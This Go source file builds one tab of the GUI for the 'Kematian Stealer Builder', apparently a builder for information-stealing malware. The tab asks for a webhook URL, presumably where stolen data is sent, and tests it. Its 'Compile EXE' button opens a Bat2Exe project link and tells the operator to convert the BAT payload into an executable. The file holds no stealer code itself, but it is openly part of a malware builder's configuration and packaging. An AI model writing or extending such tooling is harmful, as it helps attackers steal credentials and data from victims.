package exeTab

import (
	"builder/modules/options/utils"
	"image/color"
	"os/exec"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

func GetExeBuilder(a fyne.App) *fyne.Container {
	blue := color.NRGBA{R: 0, G: 128, B: 191, A: 255}
	//white := color.NRGBA{R: 255, G: 255, B: 255, A: 255}
	//red := color.NRGBA{R: 180, G: 0, B: 0, A: 255}

	mainTitle := canvas.NewText("Kematian Stealer Builder", blue)
	mainTitle.Alignment = fyne.TextAlignCenter
	mainTitle.TextSize = 18

	webhookEntry := widget.NewEntry()
	webhookEntry.SetPlaceHolder("Webhook URL")

	//basically just do nothing when the checkbox is checked
	//obfuscateCheckBox := widget.NewCheck("Obfuscate", func(_ bool) {})
	//obfuscateCheckBox.SetChecked(false)

	comepileButtonEXE := widget.NewButton("Compile EXE", func() {
		if !(utils.TestWebhook(a, webhookEntry.Text)) {
			return
		} else {
			//make a success message
			url := "https://github.com/KDot227/Bat2Exe"

			exec.Command("start", url).Run()
			utils.MakeSuccessMessage(a, "Please use BAT option then conver it to an exe USING this tool: "+url)
			//fmt.Println(obfuscateCheckBox.Checked)
		}
	})

	entryLayout := container.New(layout.NewVBoxLayout(),
		mainTitle,
		webhookEntry,
		//obfuscateCheckBox,
		layout.NewSpacer(),
		//compileButtonPS1,
		//compileButtonBAT,
		comepileButtonEXE,
	)

	return entryLayout
}
